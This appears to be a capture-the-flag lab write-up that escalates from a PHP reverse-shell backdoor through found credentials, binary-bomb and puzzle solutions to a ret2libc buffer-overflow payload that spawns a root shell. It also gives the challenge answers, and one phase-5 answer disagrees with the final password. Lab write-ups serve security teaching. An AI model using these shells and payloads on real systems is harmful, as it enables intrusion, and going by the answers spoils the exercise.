# Write-up 2

Hey there! we're going on quite the journey - we'll be exploring a system and escalating our privileges step by step. I'll walk you through everything I discovered and how we can use it to gain higher access. Let's dive in!

# Step 1 - The Initial Foothold

We'll start from where we left off with our PHP backdoor on the forum.

First things first, we need to establish a proper reverse shell. Remember that backdoor we placed? We'll use that to get a better foothold.

Let's set up our listener on our attack machine:

```bash
$> nc -lvnp 4444
```

This command tells netcat to listen (-l) on port 4444, being verbose (-v) about what it's doing.

Now, on the target server, we'll trigger our Python reverse shell through the backdoor:

```bash
curl -k https://10.13.100.236/forum/templates_c/reverse_shell.php
```

## Looking Around the System

Great! Now that we have shell access, let's see what we can find. Let's start at the root directory and look around:

```bash
$ cd /
$ ls
```

Look at all these directories! The one we're most interested in is /home, as it usually contains user-specific files:

```bash
$ cd home
$ ls
LOOKATME  ft_root  laurie  laurie@borntosec.net  lmezard  thor  zaz
```

Hey, what's this? A directory called "LOOKATME"? That's practically begging us to check it out:

```bash
$ cd LOOKATME
$ ls
password
$ cat password
lmezard:G!@M6f4Eatau{sF"
```

Sweet! We found some credentials. But what can we do with them?

## Finding Our Way In

Let's see what services are running on this machine. A quick nmap scan should tell us:

```bash
nmap 10.13.100.236

PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

Look at that - we've got FTP (port 21), SSH (port 22), and a few other services. Since we just found some credentials, let's try them on FTP:

```bash
$ ftp 10.13.100.236
```

Using lmezard as the username and that password we found... and we're in! This is getting interesting.

## What's in the FTP Server?

Let's see what files we have access to:

```bash
ftp> ls
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
```

Two files - a README and something called 'fun'. Let's grab both of them:

```bash
ftp> get README
ftp> get fun
```

The README tells us this is a challenge, and solving it will give us the password for the 'laurie' user's SSH access. Now we're getting somewhere!

## Solving the Challenge

The 'fun' file turns out to be a tar archive. Let's extract it:

```bash
$ tar xvf fun
```

This gives us a bunch of files with .pcap extensions. Don't let that fool you though - they're not actual packet capture files. Each one contains a piece of C code and a file number in the comments.

I wrote a quick Python script to piece together all these files in the right order and create a complete C program. After running it:

```bash
$ ./scripts/pcap_files_to_c.py
$ gcc main.c
$ ./a.out
```

And look what we got: "MY PASSWORD IS: Iheartpwnage"

But wait! The program tells us to SHA-256 hash this password first:

```bash
$ echo -n 'Iheartpwnage' | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

And there we have it! We can now use this hash as the password to SSH in as the 'laurie' user.

# Step 2 - The Binary Bomb Challenge!

After getting our SSH access as laurie, we're faced with what's known as a "binary bomb" - think of it as a digital puzzle box with six phases we need to carefully defuse. Let me walk you through how I solved each one!

## Getting Started with Binary Ninja

First thing I did was load the bomb binary into Binary Ninja - it's an awesome reverse engineering tool that helps us see what's going on under the hood. Looking at the main function, we can see it's structured around six different phases, each following the same pattern:
```c
read_line()
phase_X()
phase_defused()
```

Let's tackle these phases one by one!

## Phase 1 - String Comparison
When I looked at phase_1 in Binary Ninja, the decompiled code told a pretty clear story:
```c
int32_t phase_1(char* arg1)
{
    int32_t result = strings_not_equal(arg1, "Public speaking is very easy.");
    
    if (!result)
        return result;
    
    explode_bomb();
    /* no return */
}
```

The program's doing a simple string comparison - it wants us to input "Public speaking is very easy." Straightforward enough!

## Phase 2 - The Number Sequence
Phase 2 gets a bit more interesting. Here's what Binary Ninja showed us:
```c
int32_t phase_2(char* arg1)
{
    int32_t var_1c;
    read_six_numbers(arg1, &var_1c);
    
    if (var_1c != 1)
    {
        explode_bomb();
        /* no return */
    }
    
    int32_t result;
    
    for (int32_t i = 1; i <= 5; i += 1)
    {
        void var_20;
        result = (i + 1) * *(&var_20 + (i << 2));
        
        if ((&var_1c)[i] != result)
        {
            explode_bomb();
            /* no return */
        }
    }
    
    return result;
}
```

After analyzing the logic, I found it's looking for a sequence where:
- First number must be 1
- Each subsequent number follows the pattern: previous_number * position
So the sequence works out to: `"1 2 6 24 120 720"`

## Phase 3 - The Switch Statement
This phase got more complex. Looking at the decompiled code:
```c
int32_t phase_3(char* arg1)
{
    int32_t result_1;
    char var_9;
    int32_t var_8;
    
    if (sscanf(arg1, "%d %c %d", &result_1, &var_9, &var_8) <= 2)
    {
        explode_bomb();
        /* no return */
    }
    
    int32_t ebx;
    
    if (result_1 > 7)
    {
        ebx = 0x78;
        explode_bomb();
        /* no return */
    }
    
    int32_t result = result_1;
    
    switch (result)
    {
        case 0:
        {
            ebx = 0x71;
            
            if (var_8 != 0x309)
            {
                explode_bomb();
                /* no return */
            }
            break;
        }
        case 1:
        {
            ebx = 0x62;
            
            if (var_8 != 0xd6)
            {
                explode_bomb();
                /* no return */
            }
            break;
        }
        // ... more cases
    }
}
```

The program's expecting three inputs: a number, a character, and another number. After trying different combinations with the letter 'b' (The README hinted at the presence of a 'b' character), I found that `"1 b 214"` does the trick!

## Phase 4 - The Recursive Function
This phase introduced a recursive function. Here's what we're dealing with:
```c
int32_t func4(int32_t arg1)
{
    if (arg1 <= 1)
        return 1;
    
    int32_t eax_1 = func4(arg1 - 1);
    return func4(arg1 - 2) + eax_1;
}

int32_t phase_4(char* arg1)
{
    int32_t var_8;
    
    if (sscanf(arg1, "%d", &var_8) != 1 || var_8 <= 0)
    {
        explode_bomb();
        /* no return */
    }
    
    int32_t result = func4(var_8);
    
    if (result == 0x37)
        return result;
    
    explode_bomb();
    /* no return */
}
```

The function's looking for an input that makes func4 return 0x37 (55 in decimal). After writing a quick script to test different inputs, I found that `"9"` gives us exactly what we need!

## Phase 5 - The String Manipulation
Phase 5 got clever with string manipulation:
```c
int32_t phase_5(char* arg1)
{
    if (string_length(arg1) != 6)
    {
        explode_bomb();
        /* no return */
    }
    
    void var_c;
    
    for (char* i = nullptr; i <= 5; i = &i[1])
    {
        int32_t eax;
        eax = *(i + arg1);
        eax &= 0xf;
        eax = array.123[eax];
        *(i + &var_c) = eax;
    }
    
    char var_6 = 0;
    int32_t result = strings_not_equal(&var_c, "giants");
    
    if (!result)
        return result;
    
    explode_bomb();
    /* no return */
}
```

It's taking our 6-character input, running each character through a transformation, and expecting to get "giants". After writing a quick script to test different inputs we get 4 possible solutions, `"opukmq"` is the one we want!

## Phase 6 - The Node Puzzle
The final phase deals with node structures:
```c
struct nodeStruct
{
    int value;
    int index;
    struct nodeStruct* next;
};
```

Using GDB, I found the node values:
```
(gdb) p node1
$1 = 253
(gdb) p node2
$2 = 725
(gdb) p node3
$3 = 301
(gdb) p node4
$4 = 997
(gdb) p node5
$5 = 212
(gdb) p node6
$6 = 432
```

We need to order these nodes by value:
- 997 (node4)
- 725 (node2)
- 432 (node6)
- 301 (node3)
- 253 (node1)
- 212 (node5)

This gives us the solution: `"4 2 6 3 1 5"`

## Putting It All Together
Remember that hint in the subject about switching numbers around? Following that pattern, we combine all our solutions into one final password:

`Publicspeakingisveryeasy.126241207201b2149opekmq426135`

And there we have it! A perfect password to log in as thor. On to the next challenge!

# Step 3 - The Turtle Graphics Challenge!

Hey, check this out - after logging in as thor, we find ourselves facing a pretty unique challenge. There are two files in the directory: a README and something called "turtle". The README is pretty straightforward - it just tells us that solving this challenge will give us the password for the 'zaz' user.

Opening up the turtle file, I found what looks like a series of turtle graphics commands - you know, those programming exercises where you control a virtual turtle to draw things? The commands are in French, which adds a fun twist:

```
Tourne droite de 1 degrees
Avance 1 spaces
...
```

I wrote a quick Python script using the turtle graphics module to visualize these commands, and guess what? It drew out the word "SLASH"! Pretty cool, right?

But here's the catch - trying to use "SLASH" directly as the password didn't work. Then I noticed the sneaky hint at the end of the file: "Can you digest the message? :)"

That's when it clicked - we need to create an MD5 hash of the word "SLASH". Running it through MD5 (Message Digest 5):

```bash
$ echo -n 'SLASH' | md5sum
646da671ca01bb5d84dbb5fb2238dc8e
```

And that's our password for zaz! The turtle may move slowly, but we got there in the end!

# Step 4 - The Buffer Overflow Challenge

Alright, this is it - the final boss! After logging in as zaz, we find a very interesting program called `exploit_me`. And guess what? It's running with root privileges! Let's see what we're dealing with.

First, let's play around with it a bit:
```bash
$ ./exploit_me
(nothing happens)
$ ./exploit_me test
test
$ ./exploit_me test test
test
```

Interesting - it just prints out whatever we give it as the first argument. But here's where it gets exciting: after checking the security features (or lack thereof), I found out this program is basically asking to be exploited:
- No stack protection
- Executable stack
- No address randomization
- Uses strcpy() without checking bounds

It's like they left all the doors and windows open for us! 

#### What is Ret2Libc?
Ret2Libc, short for "Return-to-Libc," is an exploit technique that takes control of a program's flow by calling existing library functions in memory. It's a clever way of executing arbitrary code without injecting it directly into the program.

#### How Does It Work?
A basic Ret2Libc exploit follows this structure:  

```
padding + address of system + address of exit + address of "/bin/sh"
```  

- **Padding**: Fills the buffer to align with the return address.  
- **Address of system**: Points to the `system()` function, which can execute shell commands.  
- **Address of exit**: Ensures the program exits cleanly after execution (optional, but skipping it may cause a crash).  
- **Address of "/bin/sh"**: Points to the `/bin/sh` string in memory, which starts a shell.  

### Crafting a Ret2Libc Exploit

To build our exploit, we need three key memory addresses and the offset:  

1. **`system()`**  
   Use GDB to find the address of the `system()` function:  
   ```bash
   (gdb) info function system
   0xb7e6b060  system
   ```  

2. **`exit()`**  
   Locate the `exit()` function in memory:  
   ```bash
   (gdb) info function exit
   0xb7e5ebe0  exit
   ```  

3. **`/bin/sh` string**  
   Search for the `/bin/sh` string in the memory range of the libc library:  
   ```bash
   (gdb) info proc mappings
	   [...]
	   0xb7e2c000 0xb7fcf000   0x1a3000  0x0 /lib/i386-linux-gnu/libc-2.15.so
	   [...]
   (gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
    0xb7f8cc58
   1 pattern found.
   ```  

Binary Ninja indicates that the main function has a stack offset of 0x90 (144). Considering that the saved EBP occupies 4 bytes, we can conclude that the buffer is 140 bytes in length.

### Building the Payload

Using the memory addresses we found, we can now craft our exploit payload.  

**Structure**:  
```
padding + address of system + address of exit + address of "/bin/sh"
```  

**Payload in Python**:  
```python
"\x90"*140 + "\xb7\xe6\xb0\x60" + "\xb7\xe5\xeb\xe0" + "\xb7\xf8\xcc\x58"
```  

Run the vulnerable program with the crafted payload:  
```bash
./exploit_me `python -c 'print("\x90"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
```  

And... 

```bash
# whoami
root
```

We did it! We've got root access!